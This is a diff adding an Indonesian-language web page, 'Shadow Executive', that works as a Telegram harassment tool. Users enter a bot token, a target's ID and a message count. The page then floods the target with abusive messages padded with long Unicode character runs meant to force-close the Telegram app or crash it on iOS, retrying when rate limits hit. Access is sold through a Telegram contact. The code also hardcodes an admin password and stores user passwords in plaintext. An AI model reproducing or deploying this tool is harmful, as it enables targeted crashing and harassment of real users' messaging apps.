@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Shadow Executive 2.0.0</title>
+<style>
+  /* ===== Body dan background ===== */
+  body {
+    margin: 0; padding: 0;
+    font-family: Arial, sans-serif;
+    background: url('https://pomf2.lain.la/f/kpf88gbh.jpg') no-repeat center center fixed;
+    /* Jangan overflow hidden supaya sidebar bisa muncul */
+    overflow-x: hidden;
+    overflow-y: auto;
+  }
+
+  /* ===== Efek smoke animasi ===== */
+  .smoke {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    pointer-events: none;
+    background: radial-gradient(circle at 30% 40%, rgba(255, 0, 0, 0.15), transparent 50%),
+                radial-gradient(circle at 70% 60%, rgba(255, 50, 50, 0.12), transparent 50%),
+                radial-gradient(circle at 50% 30%, rgba(200, 0, 0, 0.1), transparent 50%);
+    animation: smokeMove 10s infinite alternate ease-in-out;
+    z-index: 0;
+  }
+  @keyframes smokeMove {
+    0% {background-position: 30% 40%, 70% 60%, 50% 30%;}
+    100% {background-position: 32% 42%, 68% 58%, 52% 32%;}
+  }
+
+  /* ===== Sidebar ===== */
+  .sidebar {
+    height: 100vh;
+    width: 0;
+    position: fixed;
+    z-index: 9999;
+    top: 0;
+    right: 0;
+    background-color: rgba(0,0,0,0.9);
+    overflow-x: hidden;
+    transition: 0.3s;
+    padding-top: 60px;
+    box-shadow: -2px 0 10px rgba(255,0,0,0.7);
+    display: flex;
+    flex-direction: column;
+    color: white;
+  }
+  .sidebar a {
+    padding: 12px 20px;
+    text-decoration: none;
+    font-size: 18px;
+    color: #ff4444;
+    display: block;
+    transition: 0.3s;
+  }
+  .sidebar a:hover {
+    background-color: #330000;
+    color: #ff9999;
+  }
+  .closebtn {
+    position: absolute;
+    top: 12px;
+    left: 15px;
+    font-size: 36px;
+    cursor: pointer;
+    color: #ff4444;
+    user-select: none;
+  }
+  .sidebar-user {
+    padding: 10px 20px;
+    font-weight: bold;
+    border-bottom: 1px solid #ff4444;
+    margin-bottom: 15px;
+  }
+  #lastLoginSidebar {
+    padding: 5px 20px 15px 20px;
+    font-size: 14px;
+    color: gold;
+  }
+
+  /* ===== Menu button hamburger ===== */
+  .menu-btn {
+    position: fixed;
+    top: 15px;
+    right: 15px;
+    font-size: 30px;
+    cursor: pointer;
+    color: #ff4444;
+    z-index: 10000;
+    user-select: none;
+    background: rgba(0,0,0,0.6);
+    border-radius: 6px;
+    padding: 5px 10px;
+    transition: background-color 0.3s;
+  }
+  .menu-btn:hover {
+    background-color: rgba(255,0,0,0.8);
+  }
+
+  /* ===== User info top right ===== */
+  .user-info {
+    position: fixed;
+    top: 15px;
+    right: 65px;
+    color: #ff4444;
+    font-weight: bold;
+    font-size: 16px;
+    z-index: 10000;
+    user-select: none;
+    display: none;
+  }
+
+  /* ===== Halaman utama .page ===== */
+  .page {
+    display: none;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    position: relative;
+    z-index: 10;
+    padding: 10px;
+    box-sizing: border-box;
+  }
+
+  /* ===== Container utama ===== */
+  .container {
+    background: rgba(255, 255, 255, 0); /* transparan penuh */
+    padding: 25px 30px;
+    border-radius: 15px;
+    max-width: 420px;
+    width: 100%;
+    box-shadow: 0 0 15px #4545455d;
+    animation: slideUp 0.8s ease;
+    box-sizing: border-box;
+  }
+
+  @keyframes slideUp {
+    from {transform: translateY(50px); opacity: 0;}
+    to {transform: translateY(0); opacity: 1;}
+  }
+
+  /* ===== Logo ===== */
+  .logo {
+    width: 80px; height: 80px; border-radius: 50%;
+    margin: 0 auto 15px auto;
+    display: block;
+    border: 2px solid #ff0000;
+    box-shadow: 0 0 10px #ff0000;
+  }
+
+  /* ===== Nama bot ===== */
+  .bot-name {
+    text-align: center;
+    font-weight: bold;
+    font-size: 24px;
+    margin-bottom: 25px;
+    text-shadow: 0 0 10px #ff0000;
+  }
+
+  /* ===== Input dan button ===== */
+  input[type="text"],
+  input[type="password"],
+  input[type="number"],
+  select {
+    width: 100%;
+    padding: 12px 10px;
+    margin: 8px 0;
+    border-radius: 8px;
+    border: none;
+    font-size: 16px;
+    box-sizing: border-box;
+  }
+
+  button {
+    width: 100%;
+    padding: 12px;
+    background-color: #ff0000;
+    border: none;
+    border-radius: 8px;
+    color: white;
+    font-weight: bold;
+    font-size: 18px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background-color: #cc0000;
+  }
+
+  /* ===== Link di dalam teks ===== */
+  a {
+    color: #ff6666;
+    cursor: pointer;
+    text-decoration: underline;
+  }
+  a:hover {
+    color: #ff2222;
+  }
+
+  /* ===== Console output styling ===== */
+  #consoleOutput {
+    background: rgba(255, 255, 255, 0); /* transparan penuh */
+    border-radius: 10px;
+    padding: 10px;
+    height: 150px;
+    overflow-y: auto;
+    white-space: pre-wrap;
+    font-family: monospace;
+    font-size: 14px;
+    box-sizing: border-box;
+    margin-top: 10px;
+  }
+
+  /* Scrollbar styling for console */
+  #consoleOutput::-webkit-scrollbar {
+    width: 8px;
+  }
+  #consoleOutput::-webkit-scrollbar-thumb {
+    background: #ff4444;
+    border-radius: 4px;
+  }
+
+  /* Blink class for last login */
+  .blink {
+    animation: blinkAnim 1.5s infinite;
+  }
+  @keyframes blinkAnim {
+    0%, 100% {opacity: 1;}
+    50% {opacity: 0.5;}
+  }
+    
+</style>
+</head>
+<body>
+
+<div class="smoke"></div>
+
+<!-- Sidebar -->
+<div id="mySidebar" class="sidebar">
+  <span class="closebtn" onclick="closeNav()">&times;</span>
+  <div id="sidebarUser" class="sidebar-user">Login: -</div>
+  <div id="lastLoginSidebar" style="display:none;"></div>
+  <a href="#" onclick="showPage('pageDashboard')">🏠 Dashboard</a>
+  <a href="#" onclick="showPage('page1')">🤖 Add Token Bot</a>
+  <a href="#" onclick="showPage('pageSpam')">🐞 Bug Menu</a>
+  <a href="#" onclick="logout()" style="color: #ff6666; font-weight: bold;">🚪 Logout</a>
+</div>
+
+<!-- user info top right -->
+<span id="userInfoTop" class="user-info"></span>
+
+<!-- Menu button (hamburger) -->
+<span id="menuButton" class="menu-btn" onclick="openNav()" style="display:none;">☰</span>
+
+<!-- Page: Login -->
+<div id="pageLogin" class="page" style="display:flex;">
+  <div class="container">
+    <img src="https://pomf2.lain.la/f/6gu8t6nu.jpg" alt="Logo" class="logo" />
+    <div class="bot-name">Shadow Executive</div>
+    <input type="text" id="loginUsername" placeholder="Username" autocomplete="off" />
+    <input type="password" id="loginPassword" placeholder="Password" autocomplete="off" />
+    <button onclick="checkLogin()">Login</button>
+    <p id="loginError" style="color:#ff4444; margin-top:10px;"></p>
+    <p style="text-align:center; margin-top: 10px;">
+      Belum punya akun? <a href="#" onclick="showRegister()">Create Akun</a>
+    </p>
+    <button id="developerButton" style="display:none; margin-top:10px;" onclick="openDeveloper()">Developer</button>
+  </div>
+</div>
+
+<!-- Page: Register -->
+<div id="pageRegister" class="page" style="display:none;">
+  <div class="container">
+    <img src="https://pomf2.lain.la/f/6gu8t6nu.jpg" alt="Logo" class="logo" />
+    <div class="bot-name">Buat Akun Baru</div>
+    <input type="text" id="registerUsername" placeholder="Username baru" autocomplete="off" />
+    <input type="password" id="registerPassword" placeholder="Password baru" autocomplete="off" />
+    <button onclick="registerUser()">Daftar Akun Baru</button>
+    <p id="registerError" style="color:#ff4444; margin-top:10px;"></p>
+    <p style="text-align:center; margin-top: 10px;">
+      Sudah punya akun? <a href="#" onclick="showLogin()">Login</a>
+    </p>
+  </div>
+</div>
+
+<!-- Halaman Dashboard -->
+<div id="pageDashboard" class="page" style="display:none;">
+  <div class="container" style="text-align:center;">
+    <h2>Selamat Datang di Dashboard</h2>
+    <p id="dashboardWelcome"></p>
+    <p>Silakan pilih menu di kanan atas untuk mulai.</p>
+  </div>
+</div>
+
+<!-- Halaman Token -->
+<div id="page1" class="page" style="display:none;">
+  <div class="container">
+    <img src="https://pomf2.lain.la/f/6gu8t6nu.jpg" alt="Logo" class="logo" />
+    <div class="bot-name">Shadow Executive</div>
+    <input type="password" id="botTokenInput" placeholder="Masukkan Token Bot Telegram" />
+    <button onclick="checkToken()">Lanjut</button>
+  </div>
+</div>
+
+<!-- Halaman Loading -->
+<div id="pageLoading" class="page" style="display:none;">
+  <div class="container">
+    <h3>Memeriksa token...</h3>
+  </div>
+</div>
+
+<!-- Halaman Bug Menu (Spam) -->
+<div id="pageSpam" class="page" style="display:none;">
+  <div class="container">
+    <img src="https://pomf2.lain.la/f/6gu8t6nu.jpg" alt="Logo" class="logo" />
+    <div class="bot-name">Shadow Executive</div>
+    <input type="text" id="targetId" placeholder="ID atau username target" />
+    <input type="number" id="msgCount" placeholder="Jumlah bug" value="1" min="1" />
+    <select id="messageSelect">
+      <option value="" disabled selected>Pilih Menu Fitur</option>
+      <option value="crash_ui">Forclose</option>
+      <option value="crash_ios">Crash Ios</option>
+    </select>
+    <button onclick="sendSpam()">Sending Bug</button>
+    <h3>Status Target :</h3>
+    <pre id="consoleOutput"></pre>
+  </div>
+</div>
+
+<script>
+function showRegister() {
+  document.getElementById("pageLogin").style.display = "none";
+  document.getElementById("pageRegister").style.display = "flex";
+}
+
+function showLogin() {
+  document.getElementById("pageRegister").style.display = "none";
+  document.getElementById("pageLogin").style.display = "flex";
+}
+
+function registerUser() {
+  const user = document.getElementById("registerUsername").value.trim();
+  const pass = document.getElementById("registerPassword").value.trim();
+  const errorEl = document.getElementById("registerError");
+
+  if (!user || !pass) {
+    errorEl.textContent = "Username dan password harus diisi!";
+    return;
+  }
+
+  // Ambil data users dari localStorage (atau inisialisasi array kosong)
+  let users = JSON.parse(localStorage.getItem("users") || "[]");
+
+  // Cek apakah username sudah ada
+  if (users.some(u => u.username === user)) {
+    errorEl.textContent = "Username sudah digunakan!";
+    return;
+  }
+
+  // Tambahkan user baru
+  users.push({ username: user, password: pass });
+  localStorage.setItem("users", JSON.stringify(users));
+
+  alert("Akun berhasil dibuat! Silakan login.");
+  showLogin();
+}
+
+// Modifikasi checkLogin supaya cek ke localStorage
+function checkLogin(){
+  const user = document.getElementById("loginUsername").value.trim();
+  const pass = document.getElementById("loginPassword").value.trim();
+  const errorEl = document.getElementById("loginError");
+
+  if (!user || !pass) {
+    errorEl.textContent = "Username dan password harus diisi!";
+    return;
+  }
+
+  // User admin tetap hardcode
+  const adminUser = "admin";
+  const adminPass = "admin123";
+
+  if (user === adminUser && pass === adminPass) {
+    loginSuccess(user, true);
+    return;
+  }
+
+  // Ambil data users dari localStorage
+  let users = JSON.parse(localStorage.getItem("users") || "[]");
+  const matchedUser = users.find(u => u.username === user && u.password === pass);
+
+  if (matchedUser) {
+    loginSuccess(user, false);
+  } else {
+    errorEl.innerHTML = `Username atau password salah. Silahkan buat akun atau beli akses di <a href="https://t.me/XyzzMoodss" target="_blank" class="buy-link">https://t.me/XyzzMoodss</a>`;
+  }
+}
+
+function loginSuccess(username, isAdmin) {
+  document.getElementById("loginError").textContent = "";
+  loggedInUser = username;
+  window.isAdmin = isAdmin;  // buat variabel global isAdmin
+  const loginTime = new Date().toString();
+  localStorage.setItem("loggedInUser", loggedInUser);
+  localStorage.setItem("lastLogin", loginTime);
+  localStorage.setItem("isAdmin", isAdmin);
+
+  document.getElementById("menuButton").style.display = "block";
+  document.getElementById("userInfoTop").textContent = `Halo, ${loggedInUser}` + (isAdmin ? " (Admin)" : "");
+  document.getElementById("userInfoTop").style.display = "block";
+  document.getElementById("sidebarUser").textContent = `Login: ${loggedInUser}`;
+
+  updateLastLoginUI(loginTime);
+  updateDashboardWelcome();
+
+  showPage("pageDashboard");
+}
+</script>
+
+<!-- Halaman Dashboard -->
+<div id="pageDashboard" class="page" style="display:none; justify-content:center; align-items:center; height:100vh;">
+  <div class="container" style="text-align:center;">
+    <h2>Selamat Datang di Dashboard</h2>
+    <p id="dashboardWelcome"></p>
+    <p>Silakan pilih menu di kanan atas untuk mulai.</p>
+  </div>
+</div>
+
+<!-- Halaman Token -->
+<div id="page1" class="page" style="display:none; justify-content:center; align-items:center; height:100vh;">
+  <div class="container">
+    <img src="https://pomf2.lain.la/f/6gu8t6nu.jpg" alt="Logo" class="logo" />
+    <div class="bot-name">Shadow Executive</div>
+    <input type="password" id="botTokenInput" placeholder="Masukkan Token Bot Telegram" />
+    <button onclick="checkToken()">Lanjut</button>
+  </div>
+</div>
+
+<!-- Halaman Loading -->
+<div id="pageLoading" class="page" style="display:none; justify-content:center; align-items:center; height:100vh;">
+  <div class="container">
+    <h3>Memeriksa token...</h3>
+  </div>
+</div>
+
+<!-- Halaman Bug Menu (Spam) -->
+<div id="pageSpam" class="page" style="display:none; justify-content:center; align-items:center; height:100vh;">
+  <div class="container">
+    <img src="https://pomf2.lain.la/f/6gu8t6nu.jpg" alt="Logo" class="logo" />
+    <div class="bot-name">Shadow Executive</div>
+    <input type="text" id="targetId" placeholder="ID atau username target" />
+    <input type="number" id="msgCount" placeholder="Jumlah bug" value="1" min="1" />
+    <select id="messageSelect">
+      <option value="" disabled selected>Pilih Menu Fitur</option>
+      <option value="crash_ui">Forclose</option>
+      <option value="crash_ios">Crash Ios</option>
+    </select>
+    <button onclick="sendSpam()">Sending Bug</button>
+    <h3>Status Target :</h3>
+    <pre id="consoleOutput"></pre>
+  </div>
+</div>
+
+<script>
+let botToken = localStorage.getItem("botToken") || "";
+let loggedInUser = "";
+let isAdmin = false;
+
+/* Update tampilan input token sesuai status token tersimpan */
+function updateTokenInputUI() {
+  const tokenInput = document.getElementById("botTokenInput");
+  if (botToken) {
+    tokenInput.value = botToken;
+    tokenInput.disabled = true;
+  } else {
+    tokenInput.value = "";
+    tokenInput.disabled = false;
+  }
+}
+
+/* Fungsi cek token bot Telegram */
+function checkToken() {
+  // Jika sudah ada token tersimpan
+  if (botToken) {
+    alert("Token bot Telegram sudah tersimpan. Tidak perlu menambahkan ulang.");
+    showPage("pageDashboard");
+    return;
+  }
+
+  const inputToken = document.getElementById("botTokenInput").value.trim();
+  if (!inputToken) {
+    alert("Masukkan token bot!");
+    return;
+  }
+  showPage("pageLoading");
+
+  fetch(`https://api.telegram.org/bot${inputToken}/getMe`)
+    .then(res => res.json())
+    .then(data => {
+      if (data.ok) {
+        botToken = inputToken;
+        localStorage.setItem("botToken", botToken);
+        alert("Token valid dan sudah disimpan.");
+        updateTokenInputUI();
+        showPage("pageDashboard");
+      } else {
+        alert("Token tidak valid!");
+        showPage("page1");
+      }
+    })
+    .catch(() => {
+      alert("Gagal memeriksa token!");
+      showPage("page1");
+    });
+}
+
+/* Fungsi untuk membuat bug crash UI */
+function getCrashUIMessage() {
+  const header = "Shadow kill you🩸";
+  const unicodeFlood = "ꦾꦾꦾꦾꦾ";
+  const maxTelegramLength = 4000;
+  return header + unicodeFlood.repeat(Math.floor((maxTelegramLength - header.length) / unicodeFlood.length));
+}
+
+/* Fungsi untuk membuat bug crash IOS */
+function getCrashIOSMessage() {
+  const header = "Lawak lo kontol🩸🩸";
+  const unicodeFlood = "𑇂𑆵𑆴𑆿";
+  const maxTelegramLength = 4000;
+  return header + unicodeFlood.repeat(Math.floor((maxTelegramLength - header.length) / unicodeFlood.length));
+}
+
+/* Fungsi mengirim spam bug */
+async function sendSpam() {
+  if (!botToken) {
+    alert("Token bot belum diatur. Silakan tambah token terlebih dahulu.");
+    showPage("page1");
+    return;
+  }
+
+  const target = document.getElementById("targetId").value.trim();
+  const count = parseInt(document.getElementById("msgCount").value, 10);
+  const selected = document.getElementById("messageSelect").value;
+
+  if (!target || !count || !selected) {
+    alert("Isi semua kolom dan pilih fitur!");
+    return;
+  }
+
+  let message = "";
+  if (selected === "crash_ui") message = getCrashUIMessage();
+  if (selected === "crash_ios") message = getCrashIOSMessage();
+
+  let sent = 0;
+  document.getElementById("consoleOutput").textContent = "";
+
+  for (let i = 0; i < count; i++) {
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: target, text: message }),
+      });
+      const data = await res.json();
+
+      if (data.ok) {
+        sent++;
+        document.getElementById("consoleOutput").textContent += `[${i + 1}] Successfully Sending Bug.\n`;
+      } else if (data.parameters && data.parameters.retry_after) {
+        document.getElementById("consoleOutput").textContent += `⏳ Limit, tunggu ${data.parameters.retry_after} detik...\n`;
+        await new Promise(r => setTimeout(r, data.parameters.retry_after * 1000));
+        i--;
+      } else {
+        document.getElementById("consoleOutput").textContent += `[${i + 1}] Gagal: ${data.description}\n`;
+      }
+    } catch (e) {
+      document.getElementById("consoleOutput").textContent += `[${i + 1}] Error: ${e.message}\n`;
+    }
+  }
+
+  document.getElementById("consoleOutput").textContent += `✅ Berhasil Sending ${sent}/${count} bug`;
+}
+
+/* Fungsi untuk menampilkan halaman */
+function showPage(id) {
+  if (!loggedInUser && id !== "pageLogin" && id !== "pageRegister") {
+    alert("Silakan login terlebih dahulu!");
+    id = "pageLogin";
+  }
+  document.querySelectorAll(".page").forEach(p => (p.style.display = "none"));
+  const el = document.getElementById(id);
+  if (el) el.style.display = "flex";
+  closeNav();
+}
+
+/* Sidebar open/close */
+function openNav() {
+  document.getElementById("mySidebar").style.width = "250px";
+}
+function closeNav() {
+  document.getElementById("mySidebar").style.width = "0";
+}
+
+/* Update tampilan welcome dashboard */
+function updateDashboardWelcome() {
+  const dashWelcome = document.getElementById("dashboardWelcome");
+  if (isAdmin) {
+    dashWelcome.textContent = `Selamat datang Admin ${loggedInUser}! Anda memiliki akses penuh.`;
+  } else {
+    dashWelcome.textContent = `Selamat datang ${loggedInUser}! Nikmati fitur yang tersedia.`;
+  }
+}
+
+/* Update info last login */
+function updateLastLoginUI(lastLogin) {
+  const now = new Date();
+  const last = new Date(lastLogin);
+  const sidebarEl = document.getElementById("lastLoginSidebar");
+  const topUserEl = document.getElementById("userInfoTop");
+
+  sidebarEl.textContent = `Last Login: ${lastLogin}`;
+  sidebarEl.style.display = "block";
+
+  const isToday = last.toDateString() === now.toDateString();
+  if (isToday) {
+    sidebarEl.style.color = "limegreen";
+    sidebarEl.classList.remove("blink");
+  } else {
+    sidebarEl.style.color = "gold";
+    sidebarEl.classList.add("blink");
+  }
+
+  if (loggedInUser) {
+    topUserEl.textContent = `Halo, ${loggedInUser}` + (isAdmin ? " (Admin)" : "");
+    topUserEl.style.display = "block";
+  }
+}
+
+/* Logout function */
+function logout() {
+  loggedInUser = "";
+  isAdmin = false;
+  botToken = "";
+  localStorage.removeItem("loggedInUser");
+  localStorage.removeItem("lastLogin");
+  localStorage.removeItem("isAdmin");
+  localStorage.removeItem("botToken");
+
+  document.getElementById("menuButton").style.display = "none";
+  document.getElementById("userInfoTop").style.display = "none";
+  document.getElementById("sidebarUser").textContent = "Login: -";
+  document.getElementById("lastLoginSidebar").style.display = "none";
+
+  closeNav();
+  showPage("pageLogin");
+}
+
+/* Developer button */
+function openDeveloper() {
+  window.open("https://t.me/XyzzMoodss", "_blank");
+}
+
+/* Init */
+window.addEventListener("load", () => {
+  const savedUser = localStorage.getItem("loggedInUser");
+  const lastLogin = localStorage.getItem("lastLogin");
+
+  updateTokenInputUI();
+
+  if (savedUser) {
+    loggedInUser = savedUser;
+    isAdmin = savedUser === "admin";
+
+    document.getElementById("menuButton").style.display = "block";
+    document.getElementById("userInfoTop").textContent =
+      `Halo, ${loggedInUser}` + (isAdmin ? " (Admin)" : "");
+    document.getElementById("userInfoTop").style.display = "block";
+    document.getElementById("sidebarUser").textContent =
+      `Login: ${loggedInUser}` + (isAdmin ? " (Admin)" : "");
+
+    if (lastLogin) updateLastLoginUI(lastLogin);
+
+    updateDashboardWelcome();
+    showPage("pageDashboard");
+  } else {
+    showPage("pageLogin");
+  }
+});
+</script>
+</body>
+</html>
